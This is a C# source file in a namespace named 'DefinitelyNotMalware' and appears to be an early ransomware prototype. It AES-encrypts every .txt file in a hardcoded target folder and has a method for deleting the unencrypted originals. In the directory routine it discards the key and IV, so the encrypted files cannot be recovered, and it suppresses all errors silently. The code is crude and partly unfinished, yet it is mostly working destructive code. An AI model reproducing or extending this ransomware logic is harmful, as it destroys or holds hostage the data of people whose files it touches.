using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Security.Cryptography;

namespace DefinitelyNotMalware
{
    public class DefinitelyNotEncryption
    {
        int n = 0;

        public void EncryptFile(string source, string destination)
        {


            using (var sourceStream = File.OpenRead(source))
            using (var destinationStream = File.Create(destination))
            using (var provider = new AesCryptoServiceProvider())
            using (var cryptoTransform = provider.CreateEncryptor())
            using (var cryptoStream = new CryptoStream(destinationStream, cryptoTransform, CryptoStreamMode.Write))
            {
                destinationStream.Write(provider.IV, 0, provider.IV.Length);
                sourceStream.CopyTo(cryptoStream);
                Console.WriteLine(System.Convert.ToBase64String(provider.Key));
                string pis = System.Convert.ToBase64String(provider.Key);

            }
        }

        //this one should be used to delete the original file that is not encrypted.
        public void deleteNotEncryptedFile(string filepath)
        {
            File.Delete(filepath);
        }

        public void EncryptDirectory(string directoryname)
        {
            try 
            { 
                string filepath = @"C:\Users\Joy\Desktop\TargetFiles\" + directoryname;
                DirectoryInfo d = new DirectoryInfo(filepath);
                Console.WriteLine(d + "------------****---------");
                

                foreach (var file in d.GetFiles("*.txt"))
                {
                    string v = @"\";
                    n++;
                    string destination = trimfilename(file.ToString()) + n.ToString() + ".txt";
                    Console.WriteLine(@"C:\Users\Joy\Desktop\TargetFiles\" + directoryname + v + destination);
                    using (var sourceStream = File.OpenRead(filepath + v + file.ToString()))
                    using (var destinationStream = File.Create(@"C:\Users\Joy\Desktop\TargetFiles\" + directoryname + v + destination))
                    using (var provider = new AesCryptoServiceProvider())
                    using (var cryptoTransform = provider.CreateEncryptor())
                    using (var cryptoStream = new CryptoStream(destinationStream, cryptoTransform, CryptoStreamMode.Write))
                    {
                        //destinationStream.Write(provider.IV, 0, provider.IV.Length);
                        sourceStream.CopyTo(cryptoStream);
                        //Console.WriteLine(System.Convert.ToBase64String(provider.Key));
                        string pis = System.Convert.ToBase64String(provider.Key);
                        Console.WriteLine(destination + "-----------**_________");
                    }
                }
                
            }
            catch
            {
                
            }
        }
        

        public string trimfilename(string filename)
        {
            string a = filename.Substring(0, filename.Length - 4);
            Console.WriteLine(a);
            return a;
        }

        public void makefile()
        {
            
        }

    }
}
